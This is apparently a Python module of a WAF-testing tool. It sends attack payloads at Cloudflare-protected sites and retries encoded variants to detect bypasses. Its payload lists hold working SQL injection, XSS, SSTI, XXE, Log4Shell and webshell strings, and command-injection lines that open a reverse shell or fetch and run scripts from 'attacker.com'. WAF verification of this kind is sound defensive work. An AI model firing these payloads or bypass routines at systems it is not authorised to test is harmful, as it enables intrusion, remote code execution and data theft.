"""WAF testing module for Cloudflare OWASP and Managed rulesets."""

import asyncio
import random
import string
import base64
import urllib.parse
from enum import Enum, auto
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
import logging

from .http_engine import HTTPEngine, HTTPMethod, HTTPResponse
from .config import Config, WAFRuleset
from .bypass_techniques import BypassTechniques

logger = logging.getLogger(__name__)


@dataclass
class WAFTestCase:
    """A WAF test case definition."""
    name: str
    category: str
    ruleset: str
    payload: str
    method: HTTPMethod
    injection_point: str
    expected_block: bool
    description: str
    cwe_id: Optional[str] = None
    owasp_category: Optional[str] = None


@dataclass
class WAFTestResult:
    """Result of a WAF test."""
    test_case: WAFTestCase
    target: str
    response_code: int
    blocked: bool
    challenge_presented: bool
    response_time: float
    cf_ray: Optional[str]
    bypass_successful: bool
    bypass_technique: Optional[str] = None
    raw_response: Optional[str] = None
    notes: List[str] = field(default_factory=list)


class WAFTester:
    """
    WAF tester for Cloudflare OWASP Core Ruleset and Managed Ruleset.
    
    Tests various attack vectors to verify WAF protection is working correctly.
    """
    
    SQL_INJECTION_PAYLOADS = [
        ("' OR '1'='1", "Basic SQLi - OR bypass"),
        ("' OR '1'='1'--", "SQLi with comment"),
        ("' OR '1'='1'/*", "SQLi with block comment"),
        ("1' AND '1'='1", "SQLi AND condition"),
        ("1 UNION SELECT NULL,NULL,NULL--", "UNION based SQLi"),
        ("1 UNION SELECT username,password FROM users--", "UNION data extraction"),
        ("'; DROP TABLE users;--", "SQLi DROP TABLE"),
        ("1'; EXEC xp_cmdshell('whoami');--", "SQLi command execution"),
        ("' OR 1=1#", "MySQL comment SQLi"),
        ("admin'--", "Simple auth bypass"),
        ("1' ORDER BY 1--+", "ORDER BY injection"),
        ("1' GROUP BY 1--+", "GROUP BY injection"),
        ("-1' UNION SELECT 1,2,3--+", "Negative UNION SQLi"),
        ("1' AND SLEEP(5)--", "Time-based blind SQLi"),
        ("1' AND BENCHMARK(10000000,SHA1('test'))--", "Benchmark SQLi"),
        ("1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "Subquery sleep SQLi"),
        ("1' WAITFOR DELAY '0:0:5'--", "MSSQL time delay"),
        ("1'; SHUTDOWN;--", "MSSQL shutdown"),
        ("1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--", "Error-based SQLi"),
        ("1' AND extractvalue(1,concat(0x7e,(SELECT version())))--", "ExtractValue SQLi"),
    ]
    
    XSS_PAYLOADS = [
        ("<script>alert('XSS')</script>", "Basic script tag XSS"),
        ("<img src=x onerror=alert('XSS')>", "IMG onerror XSS"),
        ("<svg onload=alert('XSS')>", "SVG onload XSS"),
        ("<body onload=alert('XSS')>", "Body onload XSS"),
        ("javascript:alert('XSS')", "JavaScript protocol XSS"),
        ("<iframe src='javascript:alert(1)'>", "Iframe XSS"),
        ("<input onfocus=alert('XSS') autofocus>", "Input autofocus XSS"),
        ("<marquee onstart=alert('XSS')>", "Marquee XSS"),
        ("<details open ontoggle=alert('XSS')>", "Details ontoggle XSS"),
        ("<video><source onerror=alert('XSS')>", "Video source XSS"),
        ("'><script>alert(String.fromCharCode(88,83,83))</script>", "Encoded XSS"),
        ("<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>", "Base64 encoded XSS"),
        ("<svg/onload=alert('XSS')>", "SVG without space"),
        ("<<script>alert('XSS')//<</script>", "Nested tags XSS"),
        ("<scr<script>ipt>alert('XSS')</scr</script>ipt>", "Split tag XSS"),
        ("\"><img src=x onerror=alert('XSS')>", "Attribute escape XSS"),
        ("'-alert('XSS')-'", "JS string break XSS"),
        ("</title><script>alert('XSS')</script>", "Title escape XSS"),
        ("</textarea><script>alert('XSS')</script>", "Textarea escape XSS"),
        ("<math><maction actiontype='statusline#http://google.com' xlink:href='javascript:alert(1)'>", "MathML XSS"),
    ]
    
    COMMAND_INJECTION_PAYLOADS = [
        ("; ls -la", "Basic command injection"),
        ("| cat /etc/passwd", "Pipe command injection"),
        ("& whoami", "Ampersand command injection"),
        ("`id`", "Backtick command injection"),
        ("$(id)", "Dollar command injection"),
        ("; cat /etc/passwd", "Semicolon injection"),
        ("|| whoami", "OR command injection"),
        ("&& id", "AND command injection"),
        ("\n/bin/cat /etc/passwd", "Newline injection"),
        ("; ping -c 10 127.0.0.1", "Ping command injection"),
        ("| nc -e /bin/sh attacker.com 4444", "Netcat reverse shell"),
        ("; curl http://attacker.com/shell.sh | sh", "Curl shell download"),
        ("$(curl http://attacker.com/shell.sh | sh)", "Nested curl injection"),
        ("`wget http://attacker.com/malware -O /tmp/m && chmod +x /tmp/m && /tmp/m`", "Wget injection"),
        ("| python -c 'import os; os.system(\"id\")'", "Python injection"),
    ]
    
    PATH_TRAVERSAL_PAYLOADS = [
        ("../../../etc/passwd", "Basic path traversal"),
        ("....//....//....//etc/passwd", "Double dot traversal"),
        ("..%2f..%2f..%2fetc/passwd", "URL encoded traversal"),
        ("..%252f..%252f..%252fetc/passwd", "Double URL encoded"),
        ("/etc/passwd%00", "Null byte injection"),
        ("....\/....\/....\/etc/passwd", "Backslash traversal"),
        ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd", "Full URL encoded"),
        ("..%c0%af..%c0%af..%c0%afetc/passwd", "UTF-8 encoded traversal"),
        ("..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd", "Unicode slash traversal"),
        ("/proc/self/environ", "Proc environ access"),
        ("php://filter/convert.base64-encode/resource=index.php", "PHP filter wrapper"),
        ("file:///etc/passwd", "File protocol"),
        ("....//....//....//windows/system32/config/sam", "Windows SAM traversal"),
        ("%252e%252e%252f%252e%252e%252fetc/passwd", "Triple encoded"),
    ]
    
    XXE_PAYLOADS = [
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "Basic XXE"),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>', "External XXE"),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><foo></foo>', "Parameter entity XXE"),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>', "Expect wrapper XXE"),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>', "PHP filter XXE"),
    ]
    
    SSRF_PAYLOADS = [
        ("http://localhost/admin", "Localhost SSRF"),
        ("http://127.0.0.1/admin", "Loopback SSRF"),
        ("http://[::1]/admin", "IPv6 localhost SSRF"),
        ("http://169.254.169.254/latest/meta-data/", "AWS metadata SSRF"),
        ("http://metadata.google.internal/", "GCP metadata SSRF"),
        ("http://169.254.169.254/metadata/v1/", "Azure metadata SSRF"),
        ("http://0.0.0.0:22", "Zero IP SSRF"),
        ("http://127.1/admin", "Short loopback SSRF"),
        ("http://2130706433/", "Decimal IP SSRF"),
        ("http://0x7f000001/", "Hex IP SSRF"),
        ("gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a", "Gopher SSRF"),
        ("dict://localhost:11211/stats", "Dict protocol SSRF"),
        ("file:///etc/passwd", "File protocol SSRF"),
    ]
    
    LDAP_INJECTION_PAYLOADS = [
        ("*)(uid=*))(|(uid=*", "LDAP injection"),
        ("admin)(&)", "LDAP filter bypass"),
        ("*)(objectClass=*", "LDAP wildcard injection"),
        ("admin))(|(password=*", "LDAP password extraction"),
    ]
    
    TEMPLATE_INJECTION_PAYLOADS = [
        ("{{7*7}}", "Jinja2/Twig basic SSTI"),
        ("${7*7}", "Generic template injection"),
        ("#{7*7}", "Ruby ERB injection"),
        ("<%= 7*7 %>", "ERB injection"),
        ("{{constructor.constructor('return this')()}}", "Angular SSTI"),
        ("{{config}}", "Flask config disclosure"),
        ("{{self.__class__.__mro__[2].__subclasses__()}}", "Python SSTI RCE"),
        ("${{<%[%'\"}}%\\", "Polyglot template injection"),
        ("{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "Jinja2 RCE"),
    ]
    
    HEADER_INJECTION_PAYLOADS = [
        ("value\r\nX-Injected: true", "CRLF injection"),
        ("value%0d%0aX-Injected: true", "URL encoded CRLF"),
        ("value\nSet-Cookie: injected=true", "Cookie injection via CRLF"),
        ("value\r\n\r\n<html>injected</html>", "Response splitting"),
    ]
    
    LOG4J_PAYLOADS = [
        ("${jndi:ldap://attacker.com/exploit}", "Log4j basic"),
        ("${jndi:rmi://attacker.com/exploit}", "Log4j RMI"),
        ("${${lower:j}ndi:${lower:l}dap://attacker.com/exploit}", "Log4j obfuscated"),
        ("${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/exploit}", "Log4j heavy obfuscation"),
        ("${jndi:ldap://127.0.0.1#attacker.com/exploit}", "Log4j DNS bypass"),
    ]
    
    PROTOTYPE_POLLUTION_PAYLOADS = [
        ('{"__proto__":{"admin":true}}', "Prototype pollution basic"),
        ('{"constructor":{"prototype":{"admin":true}}}', "Constructor pollution"),
        ('{"__proto__":{"shell":"/bin/sh"}}', "Prototype shell injection"),
    ]
    
    CLOUDFLARE_MANAGED_SPECIFIC = [
        ("<?php system($_GET['cmd']); ?>", "PHP webshell", "php-injection"),
        ("<%@ Page Language=\"C#\" %><%System.Diagnostics.Process.Start(\"cmd.exe\");%>", "ASP.NET webshell", "aspnet-injection"),
        (".htaccess", "Apache htaccess access", "sensitive-files"),
        ("wp-config.php", "WordPress config access", "wordpress"),
        ("/wp-admin/admin-ajax.php?action=duplicator_download", "WordPress Duplicator vuln", "wordpress-cve"),
        ("SELECT * FROM wp_users", "WordPress SQLi", "wordpress"),
        ("phpMyAdmin", "phpMyAdmin access", "admin-panels"),
        ("/administrator/", "Joomla admin access", "joomla"),
        ("Drupal.settings", "Drupal settings access", "drupal"),
        ("/etc/shadow", "Shadow file access", "sensitive-files"),
        ("/aws/credentials", "AWS credentials access", "cloud-credentials"),
        (".env", "Environment file access", "sensitive-files"),
        ("/debug/pprof/", "Go pprof debug access", "debug-endpoints"),
        ("/.git/config", "Git config access", "sensitive-files"),
        ("/server-status", "Apache server status", "debug-endpoints"),
        ("wp-content/debug.log", "WordPress debug log", "wordpress"),
    ]
    
    def __init__(self, http_engine: HTTPEngine, config: Config):
        self.http_engine = http_engine
        self.config = config
        self.bypass_techniques = BypassTechniques() if config.use_bypass_techniques else None
        self.results: List[WAFTestResult] = []
    
    async def run(self) -> List[WAFTestResult]:
        """Run WAF tests based on configuration."""
        test_cases = self._generate_test_cases()
        
        for target in self.config.get_target_urls():
            logger.info(f"Starting WAF tests against {target}")
            
            for test_case in test_cases:
                result = await self._run_test_case(test_case, target)
                self.results.append(result)
                
                if self.config.use_bypass_techniques and result.blocked:
                    bypass_results = await self._try_bypass(test_case, target)
                    self.results.extend(bypass_results)
        
        await self.http_engine.close()
        return self.results
    
    def _generate_test_cases(self) -> List[WAFTestCase]:
        """Generate test cases based on selected ruleset."""
        test_cases = []
        
        if self.config.waf_ruleset in [WAFRuleset.OWASP, WAFRuleset.BOTH]:
            test_cases.extend(self._generate_owasp_test_cases())
        
        if self.config.waf_ruleset in [WAFRuleset.CLOUDFLARE_MANAGED, WAFRuleset.BOTH]:
            test_cases.extend(self._generate_managed_test_cases())
        
        return test_cases
    
    def _generate_owasp_test_cases(self) -> List[WAFTestCase]:
        """Generate OWASP Core Ruleset test cases."""
        test_cases = []
        
        for payload, desc in self.SQL_INJECTION_PAYLOADS:
            test_cases.append(WAFTestCase(
                name=f"SQLi: {desc}",
                category="SQL Injection",
                ruleset="OWASP",
                payload=payload,
                method=HTTPMethod.GET,
                injection_point="query_param",
                expected_block=True,
                description=desc,
                cwe_id="CWE-89",
                owasp_category="A03:2021-Injection"
            ))
        
        for payload, desc in self.XSS_PAYLOADS:
            test_cases.append(WAFTestCase(
                name=f"XSS: {desc}",
                category="Cross-Site Scripting",
                ruleset="OWASP",
                payload=payload,
                method=HTTPMethod.GET,
                injection_point="query_param",
                expected_block=True,
                description=desc,
                cwe_id="CWE-79",
                owasp_category="A03:2021-Injection"
            ))
        
        for payload, desc in self.COMMAND_INJECTION_PAYLOADS:
            test_cases.append(WAFTestCase(
                name=f"CMDi: {desc}",
                category="Command Injection",
                ruleset="OWASP",
                payload=payload,
                method=HTTPMethod.GET,
                injection_point="query_param",
                expected_block=True,
                description=desc,
                cwe_id="CWE-78",
                owasp_category="A03:2021-Injection"
            ))
        
        for payload, desc in self.PATH_TRAVERSAL_PAYLOADS:
            test_cases.append(WAFTestCase(
                name=f"LFI: {desc}",
                category="Path Traversal",
                ruleset="OWASP",
                payload=payload,
                method=HTTPMethod.GET,
                injection_point="path",
                expected_block=True,
                description=desc,
                cwe_id="CWE-22",
                owasp_category="A01:2021-Broken Access Control"
            ))
        
        for payload, desc in self.XXE_PAYLOADS:
            test_cases.append(WAFTestCase(
                name=f"XXE: {desc}",
                category="XML External Entity",
                ruleset="OWASP",
                payload=payload,
                method=HTTPMethod.POST,
                injection_point="body",
                expected_block=True,
                description=desc,
                cwe_id="CWE-611",
                owasp_category="A05:2021-Security Misconfiguration"
            ))
        
        for payload, desc in self.SSRF_PAYLOADS:
            test_cases.append(WAFTestCase(
                name=f"SSRF: {desc}",
                category="Server-Side Request Forgery",
                ruleset="OWASP",
                payload=payload,
                method=HTTPMethod.GET,
                injection_point="query_param",
                expected_block=True,
                description=desc,
                cwe_id="CWE-918",
                owasp_category="A10:2021-SSRF"
            ))
        
        for payload, desc in self.TEMPLATE_INJECTION_PAYLOADS:
            test_cases.append(WAFTestCase(
                name=f"SSTI: {desc}",
                category="Server-Side Template Injection",
                ruleset="OWASP",
                payload=payload,
                method=HTTPMethod.GET,
                injection_point="query_param",
                expected_block=True,
                description=desc,
                cwe_id="CWE-1336",
                owasp_category="A03:2021-Injection"
            ))
        
        for payload, desc in self.LOG4J_PAYLOADS:
            test_cases.append(WAFTestCase(
                name=f"Log4Shell: {desc}",
                category="Log4j RCE",
                ruleset="OWASP",
                payload=payload,
                method=HTTPMethod.GET,
                injection_point="header",
                expected_block=True,
                description=desc,
                cwe_id="CWE-917",
                owasp_category="A06:2021-Vulnerable Components"
            ))
        
        return test_cases
    
    def _generate_managed_test_cases(self) -> List[WAFTestCase]:
        """Generate Cloudflare Managed Ruleset test cases."""
        test_cases = []
        
        for payload, desc, category in self.CLOUDFLARE_MANAGED_SPECIFIC:
            test_cases.append(WAFTestCase(
                name=f"CF-Managed: {desc}",
                category=category,
                ruleset="Cloudflare Managed",
                payload=payload,
                method=HTTPMethod.GET,
                injection_point="query_param" if "=" not in payload else "path",
                expected_block=True,
                description=desc
            ))
        
        test_cases.extend(self._generate_owasp_test_cases())
        
        scanner_payloads = [
            ("Nikto", "Nikto scanner UA"),
            ("sqlmap", "SQLmap scanner UA"),
            ("Nessus", "Nessus scanner UA"),
            ("Burp", "Burp Suite scanner"),
            ("OWASP ZAP", "ZAP scanner UA"),
            ("Acunetix", "Acunetix scanner UA"),
            ("Nmap", "Nmap scanner UA"),
        ]
        
        for ua, desc in scanner_payloads:
            test_cases.append(WAFTestCase(
                name=f"Scanner: {desc}",
                category="scanner-detection",
                ruleset="Cloudflare Managed",
                payload=ua,
                method=HTTPMethod.GET,
                injection_point="user_agent",
                expected_block=True,
                description=desc
            ))
        
        return test_cases
    
    async def _run_test_case(self, test_case: WAFTestCase, target: str) -> WAFTestResult:
        """Run a single test case."""
        
        url = target
        headers = {}
        params = {}
        data = None
        
        if test_case.injection_point == "query_param":
            params = {"test": test_case.payload}
        elif test_case.injection_point == "path":
            url = f"{target.rstrip('/')}/{test_case.payload}"
        elif test_case.injection_point == "body":
            data = test_case.payload
            headers["Content-Type"] = "application/xml" if "xml" in test_case.payload.lower() else "application/x-www-form-urlencoded"
        elif test_case.injection_point == "header":
            headers["X-Test"] = test_case.payload
            headers["User-Agent"] = test_case.payload
        elif test_case.injection_point == "user_agent":
            headers["User-Agent"] = test_case.payload
        
        response = await self.http_engine.request(
            url,
            test_case.method,
            headers=headers,
            params=params,
            data=data,
            timeout=self.config.timeout
        )
        
        blocked = self._is_blocked(response)
        
        return WAFTestResult(
            test_case=test_case,
            target=target,
            response_code=response.status_code,
            blocked=blocked,
            challenge_presented=response.challenge_presented,
            response_time=response.elapsed_time,
            cf_ray=response.cf_ray,
            bypass_successful=False,
            raw_response=response.body[:500] if response.body else None
        )
    
    def _is_blocked(self, response: HTTPResponse) -> bool:
        """Determine if a request was blocked by WAF."""
        if response.status_code in [403, 406, 429, 503]:
            return True
        
        if response.blocked or response.challenge_presented:
            return True
        
        block_indicators = [
            "blocked",
            "access denied",
            "forbidden",
            "ray id",
            "cloudflare",
            "attention required",
            "security check",
            "waf",
            "firewall"
        ]
        
        if response.body:
            body_lower = response.body.lower()
            if any(indicator in body_lower for indicator in block_indicators):
                return True
        
        return False
    
    async def _try_bypass(self, test_case: WAFTestCase, target: str) -> List[WAFTestResult]:
        """Try various bypass techniques for a blocked payload."""
        if not self.bypass_techniques:
            return []
        
        bypass_results = []
        
        encodings = self.bypass_techniques.get_waf_evasion_encoding(test_case.payload)
        
        for encoding_name, encoded_payload in encodings[1:]:
            modified_test = WAFTestCase(
                name=f"{test_case.name} ({encoding_name})",
                category=test_case.category,
                ruleset=test_case.ruleset,
                payload=encoded_payload,
                method=test_case.method,
                injection_point=test_case.injection_point,
                expected_block=test_case.expected_block,
                description=f"{test_case.description} with {encoding_name} encoding"
            )
            
            result = await self._run_test_case(modified_test, target)
            result.bypass_technique = encoding_name
            result.bypass_successful = not result.blocked
            
            bypass_results.append(result)
            
            if result.bypass_successful:
                logger.warning(f"Bypass successful using {encoding_name} for {test_case.name}")
        
        for content_type in self.bypass_techniques.get_content_type_variations()[:5]:
            if test_case.method == HTTPMethod.POST:
                url = target
                headers = {"Content-Type": content_type}
                
                response = await self.http_engine.request(
                    url,
                    HTTPMethod.POST,
                    headers=headers,
                    data=test_case.payload,
                    timeout=self.config.timeout
                )
                
                blocked = self._is_blocked(response)
                
                result = WAFTestResult(
                    test_case=test_case,
                    target=target,
                    response_code=response.status_code,
                    blocked=blocked,
                    challenge_presented=response.challenge_presented,
                    response_time=response.elapsed_time,
                    cf_ray=response.cf_ray,
                    bypass_successful=not blocked,
                    bypass_technique=f"Content-Type: {content_type}"
                )
                
                bypass_results.append(result)
        
        return bypass_results
    
    def get_summary(self) -> Dict[str, Any]:
        """Get a summary of test results."""
        total = len(self.results)
        blocked = sum(1 for r in self.results if r.blocked)
        bypassed = sum(1 for r in self.results if r.bypass_successful)
        challenged = sum(1 for r in self.results if r.challenge_presented)
        
        by_category: Dict[str, Dict[str, int]] = {}
        for result in self.results:
            cat = result.test_case.category
            if cat not in by_category:
                by_category[cat] = {"total": 0, "blocked": 0, "bypassed": 0}
            by_category[cat]["total"] += 1
            if result.blocked:
                by_category[cat]["blocked"] += 1
            if result.bypass_successful:
                by_category[cat]["bypassed"] += 1
        
        return {
            "total_tests": total,
            "blocked": blocked,
            "bypassed": bypassed,
            "challenged": challenged,
            "block_rate": blocked / total * 100 if total > 0 else 0,
            "bypass_rate": bypassed / total * 100 if total > 0 else 0,
            "by_category": by_category
        }
